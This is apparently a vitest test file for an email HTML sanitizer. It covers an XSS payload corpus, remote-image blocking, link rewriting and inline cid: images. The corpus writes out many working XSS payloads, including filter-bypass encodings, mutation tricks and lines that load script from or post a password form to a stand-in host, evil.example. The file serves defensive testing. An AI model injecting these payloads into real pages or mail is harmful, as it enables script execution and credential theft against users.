/**
 * Unit tests for the HTML mail sanitizer (roadmap 2.9): an XSS corpus whose
 * payloads must not survive, plus remote-content blocking on/off, inline
 * cid: images and link rewriting.
 */
import { describe, expect, it } from 'vitest'
import { sanitizeCss, sanitizeMailHtml } from '../src/mail/html-sanitizer'

const ALLOWED_TAGS = new Set(
  (
    'a abbr address article aside b bdi bdo big blockquote br caption center cite code col ' +
    'colgroup dd del details dfn div dl dt em figcaption figure font footer h1 h2 h3 h4 h5 h6 ' +
    'header hr i img ins kbd li main mark nav ol p pre q s samp section small span strike ' +
    'strong style sub summary sup table tbody td tfoot th thead time tr tt u ul var wbr'
  ).split(' '),
)

function clean(html: string, allowRemote = false, inlineImages?: Map<string, string>) {
  return sanitizeMailHtml(html, { allowRemote, inlineImages })
}

/** Structural checks every sanitized output must pass. */
function assertSafe(html: string): void {
  // Every `<` starts an allowed (start or end) tag: text and attribute
  // values are escaped, style text carries `\3c ` instead of `<`.
  for (const match of html.matchAll(/<(\/?)([^\s/>]*)/g)) {
    expect(ALLOWED_TAGS.has(match[2]!.toLowerCase()), `tag <${match[1]}${match[2]}>`).toBe(true)
  }
  // Attribute names inside tags: no event handlers, no srcset/formaction etc.
  for (const tag of html.matchAll(/<[a-z0-9]+((?:\s+[^\s=>]+(?:="[^"]*")?)*)\s*\/?>/gi)) {
    for (const attr of tag[1]!.matchAll(/\s+([^\s=>]+)/g)) {
      expect(attr[1]!.toLowerCase()).not.toMatch(/^on|^(srcset|formaction|action|xlink|srcdoc)/)
    }
  }
  expect(html).not.toMatch(/javascript\s*:/i)
  expect(html).not.toMatch(/vbscript\s*:/i)
  expect(html).not.toMatch(/data:text\/html/i)
  expect(html).not.toMatch(/data:image\/svg/i)
  // Neutralized CSS is renamed to `blocked-*` (unknown -> ignored by browsers).
  expect(html).not.toMatch(/(?<![\w-])expression\s*\(/i)
  expect(html).not.toMatch(/(?<![\w-])(-moz-binding|behavior)\s*:/i)
  expect(html).not.toMatch(/@import/i)
}

const XSS_CORPUS: string[] = [
  '<script>alert(1)</script>',
  '<SCRIPT SRC=http://evil.example/x.js></SCRIPT>',
  '<scr<script>ipt>alert(1)</scr</script>ipt>',
  '<img src=x onerror=alert(1)>',
  '<img src="x" ONERROR="alert(1)">',
  '<img/src=x/onerror=alert(1)>',
  '<body onload=alert(1)>',
  '<div onmouseover="alert(1)">x</div>',
  '<a href="javascript:alert(1)">x</a>',
  '<a href="JaVaScRiPt:alert(1)">x</a>',
  '<a href=" javascript:alert(1)">x</a>',
  '<a href="java\tscript:alert(1)">x</a>',
  '<a href="java&#x09;script:alert(1)">x</a>',
  '<a href="&#106;&#97;&#118;&#97;&#115;&#99;&#114;&#105;&#112;&#116;&#58;alert(1)">x</a>',
  '<a href="&#x6A;&#x61;&#x76;&#x61;&#x73;&#x63;&#x72;&#x69;&#x70;&#x74;&#x3A;alert(1)">x</a>',
  '<a href="jav&#x0A;ascript:alert(1)">x</a>',
  '<a href="&#0000106avascript:alert(1)">x</a>',
  '<a href="vbscript:msgbox(1)">x</a>',
  '<a href="data:text/html;base64,PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==">x</a>',
  '<a href="javascript&colon;alert(1)">x</a>',
  '<img src="data:image/svg+xml;base64,PHN2ZyBvbmxvYWQ9YWxlcnQoMSk+">',
  '<svg onload=alert(1)>',
  '<svg><script>alert(1)</script></svg>',
  '<svg><a xlink:href="javascript:alert(1)"><text>x</text></a></svg>',
  '<svg><style><img src=x onerror=alert(1)></style></svg>',
  '<math><mtext><table><mglyph><style><img src=x onerror=alert(1)>',
  '<math><mi xlink:href="javascript:alert(1)">x</mi></math>',
  '<form><math><mtext></form><form><mglyph><style></math><img src onerror=alert(1)>',
  '<iframe src="javascript:alert(1)"></iframe>',
  '<iframe srcdoc="<script>alert(1)</script>"></iframe>',
  '<object data="javascript:alert(1)"></object>',
  '<embed src="javascript:alert(1)">',
  '<form action="javascript:alert(1)"><input type=submit></form>',
  '<form action="https://evil.example/collect"><input name=pw><button>Login</button></form>',
  '<button formaction="javascript:alert(1)">x</button>',
  '<meta http-equiv="refresh" content="0;url=javascript:alert(1)">',
  '<meta http-equiv="refresh" content="0; url=https://evil.example/">',
  '<base href="https://evil.example/">',
  '<link rel=stylesheet href="https://evil.example/x.css">',
  '<div style="width: expression(alert(1))">x</div>',
  '<div style="background:url(javascript:alert(1))">x</div>',
  '<div style="behavior: url(x.htc)">x</div>',
  '<div style="-moz-binding: url(http://evil.example/x.xml#x)">x</div>',
  '<style>@import "https://evil.example/x.css";</style>',
  '<style>@import url(https://evil.example/x.css);</style>',
  '<style>body{background:url("javascript:alert(1)")}</style>',
  '<style></style><script>alert(1)</script>',
  '<style>a{}</style ><img src=x onerror=alert(1)>',
  '<style>\\3c /style\\3e \\3c img src=x onerror=alert(1)\\3e </style>',
  '<style>/*</style><img src=x onerror=alert(1)>*/</style>',
  '<!--<img src=x onerror=alert(1)>-->',
  '<!-- --!><img src=x onerror=alert(1)> -->',
  '<!--[if gte mso 9]><script>alert(1)</script><![endif]-->',
  '<![CDATA[><img src=x onerror=alert(1)>]]>',
  '<noscript><p title="</noscript><img src=x onerror=alert(1)>"></noscript>',
  '<title><img src=x onerror=alert(1)></title>',
  '<textarea><img src=x onerror=alert(1)></textarea>',
  '<xmp><img src=x onerror=alert(1)></xmp>',
  '<noembed><img src=x onerror=alert(1)></noembed>',
  '<template><img src=x onerror=alert(1)></template>',
  '<details open ontoggle=alert(1)>x</details>',
  '<video><source onerror=alert(1)></video>',
  '<audio src=x onerror=alert(1)>',
  '<img srcset="x 1x, javascript:alert(1) 2x">',
  '<isindex action="javascript:alert(1)">',
  '<marquee onstart=alert(1)>x</marquee>',
  '<a href="#" onclick="alert(1)">x</a>',
  '<p style="x:\\65 xpression(alert(1))">x</p>',
  '<p style="background:u\\72l(javascript:alert(1))">x</p>',
  '<<script>script>alert(1)<</script>/script>',
  '<img src="x` `<script>alert(1)</script>"` `>',
  '<a href="https://ok.example/"title="x"onmouseover="alert(1)">x</a>',
]

describe('sanitizeMailHtml: XSS corpus', () => {
  it.each(XSS_CORPUS)('neutralizes %s', (payload) => {
    for (const allowRemote of [false, true]) {
      const { html } = clean(`<p>before</p>${payload}<p>after</p>`, allowRemote)
      assertSafe(html)
      expect(html).not.toMatch(/<(script|iframe|object|embed|form|input|button|meta|base|link)/i)
      expect(html).not.toMatch(/<(svg|math|textarea|select|template|noscript|video|audio)/i)
    }
  })

  it('keeps harmless formatting', () => {
    const { html } = clean(
      '<table width="600" cellpadding="0" bgcolor="#ffffff"><tr><td align="center" style="color: #333; font-size: 14px">' +
        '<h1>Hallo</h1><p><b>fett</b> <i>kursiv</i> <font color="red" face="Arial">rot</font></p></td></tr></table>',
    )
    expect(html).toContain('<table width="600" cellpadding="0" bgcolor="#ffffff">')
    expect(html).toContain('<td align="center" style="color: #333; font-size: 14px">')
    expect(html).toContain('<font color="red" face="Arial">rot</font>')
  })

  it('drops the document shell, head and title', () => {
    const { html } = clean(
      '<!DOCTYPE html><html><head><title>Secret title</title><meta charset="utf-8"></head><body><p>x</p></body></html>',
    )
    expect(html).toBe('<div><p>x</p></div>')
  })

  it('keeps body colors on the replacement div', () => {
    const { html } = clean('<body bgcolor="#eeeeee" style="margin:0"><p>x</p></body>')
    expect(html).toBe('<div style="background-color: #eeeeee; margin:0"><p>x</p></div>')
  })

  it('rejects colors that are not plain values', () => {
    const { html } = clean('<td bgcolor="red;background:url(https://x.example/t)">x</td>')
    expect(html).not.toContain('bgcolor')
  })
})

describe('sanitizeMailHtml: links', () => {
  it('opens http(s) links in a new tab without opener/referrer', () => {
    const { html } = clean('<a href="https://example.com/a?b=1&amp;c=2">x</a>')
    expect(html).toBe(
      '<a href="https://example.com/a?b=1&amp;c=2" target="_blank" rel="noopener noreferrer nofollow">x</a>',
    )
  })

  it('overrides a target/rel given by the mail', () => {
    const { html } = clean('<a href="https://example.com/" target="_self" rel="opener">x</a>')
    expect(html).toContain('target="_blank" rel="noopener noreferrer nofollow"')
    expect(html).not.toContain('_self')
    expect(html).not.toMatch(/rel="opener"/)
  })

  it('keeps mailto, drops relative, fragment and other schemes', () => {
    expect(clean('<a href="mailto:a@example.com">x</a>').html).toContain(
      'href="mailto:a@example.com"',
    )
    for (const href of ['/api/auth/session', '#top', 'ftp://x.example/', 'file:///etc/passwd']) {
      expect(clean(`<a href="${href}">x</a>`).html).not.toContain('href=')
    }
  })
})

describe('sanitizeMailHtml: remote content', () => {
  const mail =
    '<style>.hero { background-image: url("https://cdn.example/hero.png") }</style>' +
    '<table background="https://cdn.example/bg.png"><tr><td style="background: url(https://cdn.example/td.png)">' +
    '<img src="https://cdn.example/logo.png" alt="Logo">' +
    '<img src="http://track.example/open.gif?u=123" width="1" height="1">' +
    '<img src="//cdn.example/protocol-relative.png">' +
    '</td></tr></table>'

  it('blocks remote images, backgrounds and CSS urls by default', () => {
    const { html, remoteContentBlocked } = clean(mail)
    expect(remoteContentBlocked).toBe(true)
    expect(html).not.toMatch(/https?:|\/\/cdn|track\.example/)
    expect(html).toContain('alt="Logo"')
    expect(html).toContain('background-image: none')
  })

  it('keeps http(s) images when remote content is allowed', () => {
    const { html, remoteContentBlocked } = clean(mail, true)
    expect(remoteContentBlocked).toBe(false)
    expect(html).toContain('<img src="https://cdn.example/logo.png" alt="Logo"')
    expect(html).toContain('src="http://track.example/open.gif?u=123"')
    expect(html).toContain('src="https://cdn.example/protocol-relative.png"')
    expect(html).toContain('background="https://cdn.example/bg.png"')
    expect(html).toContain('url("https://cdn.example/hero.png")')
    expect(html).toContain('referrerpolicy="no-referrer"')
  })

  it('does not report blocking for mails without remote content', () => {
    expect(clean('<p>Hallo <img src="data:image/png;base64,iVBORw0KGgo="></p>')).toEqual({
      html: '<p>Hallo <img src="data:image/png;base64,iVBORw0KGgo=" referrerpolicy="no-referrer" /></p>',
      remoteContentBlocked: false,
    })
  })

  it('never loads relative or non-http resources, even when allowed', () => {
    const { html } = clean(
      '<img src="/api/messages/actions"><img src="ftp://x.example/a.png"><img src="file:///a.png">',
      true,
    )
    expect(html).not.toContain('src=')
  })

  it('drops srcset, also when remote content is allowed', () => {
    const { html } = clean(
      '<img src="https://a.example/1.png" srcset="https://b.example/2.png 2x">',
      true,
    )
    expect(html).not.toContain('srcset')
    expect(html).not.toContain('b.example')
  })

  it('blocks obfuscated CSS urls', () => {
    for (const style of [
      'background: u\\72l(https://t.example/a)',
      'background: \\75 \\72 \\6c (https://t.example/a)',
      'background: ur/**/l(https://t.example/a)',
      'background: url( "https://t.example/a" )',
      "background: URL('https://t.example/a')",
      'background: image-set("https://t.example/a" 1x)',
      'background: -webkit-image-set(url(https://t.example/a) 1x)',
      'background: \\\\75 rl(https://t.example/a)',
    ]) {
      const { html } = clean(`<div style="${style.replace(/"/g, '&quot;')}">x</div>`)
      const decoded = html.replace(/&quot;/g, '"')
      expect(decoded, style).not.toMatch(/(?<![\w-])url\(\s*["']?https?:/i)
      expect(decoded, style).not.toMatch(/(?<![\w-])(-webkit-)?image-set\(/i)
      expect(decoded, style).not.toMatch(/(?<!\\)\\7/)
    }
  })
})

describe('sanitizeMailHtml: inline images', () => {
  it('resolves cid: references to raster data URLs only', () => {
    const images = new Map([['logo@example', 'data:image/png;base64,iVBORw0KGgo=']])
    const { html, remoteContentBlocked } = clean(
      '<img src="cid:logo@example"><img src="cid:unknown@example"><img src="CID:%3Clogo@example%3E">',
      false,
      images,
    )
    expect(remoteContentBlocked).toBe(false)
    expect(html.match(/data:image\/png/g)).toHaveLength(2)
    expect(html).not.toContain('cid:')
  })

  it('rejects non-image and svg data URLs', () => {
    for (const src of [
      'data:text/html;base64,PHNjcmlwdD4=',
      'data:image/svg+xml;base64,PHN2Zz4=',
      'data:image/png,<script>',
    ]) {
      expect(clean(`<img src="${src}">`).html).not.toContain('src=')
    }
  })
})

describe('sanitizeCss', () => {
  const ctx = () => ({
    allowRemote: false,
    inlineImages: new Map<string, string>(),
    remoteBlocked: false,
  })

  it('never emits `<` (raw style text cannot end the element)', () => {
    expect(sanitizeCss('a::after { content: "</style><script>" }', ctx())).not.toContain('<')
  })

  it('keeps ordinary rules', () => {
    expect(sanitizeCss('.a > .b { color: #333; margin: 0 auto }', ctx())).toBe(
      '.a > .b { color: #333; margin: 0 auto }',
    )
  })

  it('reports blocked remote urls', () => {
    const c = ctx()
    expect(sanitizeCss('.a { background: url(https://t.example/p.gif) }', c)).toBe(
      '.a { background: none }',
    )
    expect(c.remoteBlocked).toBe(true)
  })
})
